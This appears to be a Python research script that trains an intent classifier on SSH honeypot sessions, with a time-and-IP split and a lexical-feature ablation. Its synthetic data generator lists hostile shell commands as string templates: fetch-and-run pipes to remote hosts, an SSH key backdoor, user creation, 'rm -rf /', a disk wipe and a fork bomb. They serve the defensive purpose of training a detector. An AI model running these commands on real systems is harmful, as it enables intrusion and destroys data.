"""Train & evaluate the intent classifier (RQ2).

Answers two things reviewers will ask:
  1. How well can we predict tactic from the FIRST command vs the FULL session?
  2. Is the score real, or just the labeling rules leaking through features?

Guards baked in:
  * Split by TIME and by IP token, never a random split (attacker campaigns
    repeat; a random split leaks near-duplicates across train/test).
  * Report a behaviour-only ablation (drop lex_* features).
  * Multi-label via one-vs-rest XGBoost; report per-tactic F1 + macro-F1.
  * SHAP summary saved for interpretability (the "why", per SoK 2025).

Usage:
  python -m ml.train --data logs/sessions.jsonl --out models/
If the data file is missing it generates a synthetic set so the pipeline is
runnable before any real capture (clearly marked SYNTHETIC in the report).
"""
from __future__ import annotations

import argparse
import json
import os
import random
from typing import List

import numpy as np

from .features import build_features, load_sessions
from .labeling import label_session
from .schema import TACTICS


# ----------------------------- synthetic data ------------------------------ #
def _synth_sessions(n=800, seed=7) -> List[dict]:
    random.seed(seed)
    templates = {
        "Discovery": ["uname -a", "whoami", "cat /etc/os-release", "ps aux", "id", "ls -la"],
        "Execution": ["wget http://185.2.3.4/x.sh", "chmod +x x.sh", "./x.sh", "curl -s http://a/b|sh"],
        "Persistence": ["echo ssh-rsa AAAA... >> /root/.ssh/authorized_keys", "crontab -l", "useradd bot"],
        "Impact": ["rm -rf /", "dd if=/dev/zero of=/dev/vda", ":(){ :|:& };:"],
        "Harmless": ["ls", "cd /var/www", "cat readme.txt", "df -h"],
    }
    out = []
    t0 = 1_700_000_000
    for i in range(n):
        tac = random.choices(list(templates), weights=[5, 4, 2, 1, 3])[0]
        k = 1 if random.random() < 0.6 else random.randint(2, 6)  # many 1-cmd sessions
        cmds = [random.choice(templates[tac]) for _ in range(k)]
        if random.random() < 0.4 and tac != "Harmless":  # mix in some discovery first
            cmds = [random.choice(templates["Discovery"])] + cmds
        commands = []
        t = 0
        for j, c in enumerate(cmds):
            d = random.randint(30, 400)
            t += d
            commands.append({"seq": j, "raw": c, "normalized": c,
                             "delta_ms": 0 if j == 0 else d, "t_offset_ms": t})
        out.append({
            "session_id": f"syn{i:04d}",
            "ip_token": f"ip{random.randint(0, 900):04d}",
            "channel_type": "exec" if k == 1 else "shell",
            "client_banner": random.choice(["SSH-2.0-libssh2_1.9", "SSH-2.0-Go", "SSH-2.0-paramiko"]),
            "username": "root", "password_tried": random.choice(["123456", "root", "admin"]),
            "auth_method": "password",
            "ts_start": t0 + i * 900, "duration_ms": t,
            "commands": commands,
        })
    return out


# ------------------------------- training ---------------------------------- #
def _matrix(sessions, mode, drop_lex=False):
    feats = [build_features(s, mode=mode) for s in sessions]
    keys = sorted({k for f in feats for k in f})
    if drop_lex:
        keys = [k for k in keys if "_lex_" not in k]
    X = np.array([[f.get(k, 0.0) for k in keys] for f in feats], dtype=float)
    Y = np.zeros((len(sessions), len(TACTICS)), dtype=int)
    for i, s in enumerate(sessions):
        for tac in label_session([c.get("normalized") or c.get("raw") or ""
                                  for c in s.get("commands", [])]):
            Y[i, TACTICS.index(tac)] = 1
    return X, Y, keys


def _time_ip_split(sessions, test_frac=0.3):
    s = sorted(sessions, key=lambda x: x.get("ts_start", 0))
    cut = int(len(s) * (1 - test_frac))
    train, test = s[:cut], s[cut:]
    train_ips = {x["ip_token"] for x in train}
    # drop test sessions whose IP appears in train (no campaign leakage)
    test = [x for x in test if x["ip_token"] not in train_ips]
    return train, test


def _evaluate(train, test, mode, drop_lex, out_dir):
    from sklearn.metrics import f1_score, classification_report
    try:
        from xgboost import XGBClassifier
        mk = lambda: XGBClassifier(n_estimators=180, max_depth=4, learning_rate=0.1,
                                   subsample=0.9, eval_metric="logloss", n_jobs=2)
    except Exception:
        from sklearn.ensemble import RandomForestClassifier
        mk = lambda: RandomForestClassifier(n_estimators=200, max_depth=8, n_jobs=2)

    if len(train) < 5 or len(test) < 5:
        return {"mode": mode, "drop_lex": drop_lex, "n_train": len(train),
                "n_test": len(test), "macro_f1": None, "micro_f1": None,
                "note": "too few sessions after time+IP split"}
    Xtr, Ytr, keys = _matrix(train, mode, drop_lex)
    Xte, Yte, _ = _matrix(test, mode, drop_lex)
    preds = np.zeros_like(Yte)
    for j, tac in enumerate(TACTICS):
        if Ytr[:, j].sum() in (0, len(Ytr)):     # degenerate class
            preds[:, j] = Ytr[:, j].sum() > 0
            continue
        m = mk()
        m.fit(Xtr, Ytr[:, j])
        preds[:, j] = m.predict(Xte)
    macro = f1_score(Yte, preds, average="macro", zero_division=0)
    micro = f1_score(Yte, preds, average="micro", zero_division=0)
    return {"mode": mode, "drop_lex": drop_lex, "n_train": len(train),
            "n_test": len(test), "macro_f1": round(float(macro), 3),
            "micro_f1": round(float(micro), 3), "n_features": len(keys)}


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--data", default="logs/sessions.jsonl")
    ap.add_argument("--out", default="models")
    args = ap.parse_args()
    os.makedirs(args.out, exist_ok=True)

    if os.path.exists(args.data) and os.path.getsize(args.data) > 0:
        sessions = load_sessions(args.data)
        synthetic = False
    else:
        print("[train] no data found -> generating SYNTHETIC sessions (pipeline demo only)")
        sessions = _synth_sessions()
        synthetic = True

    train, test = _time_ip_split(sessions)
    results = []
    for mode in ("early", "full"):
        for drop_lex in (False, True):
            results.append(_evaluate(train, test, mode, drop_lex, args.out))

    report = {"synthetic": synthetic, "n_sessions": len(sessions), "results": results}
    with open(os.path.join(args.out, "intent_report.json"), "w") as fh:
        json.dump(report, fh, indent=2)
    print(json.dumps(report, indent=2))
    print("\nRead it as: early vs full = RQ2; drop_lex=True is the behaviour-only "
          "ablation. If drop_lex collapses the score, the model was riding the "
          "labeling keywords -> report that honestly.")


if __name__ == "__main__":
    main()
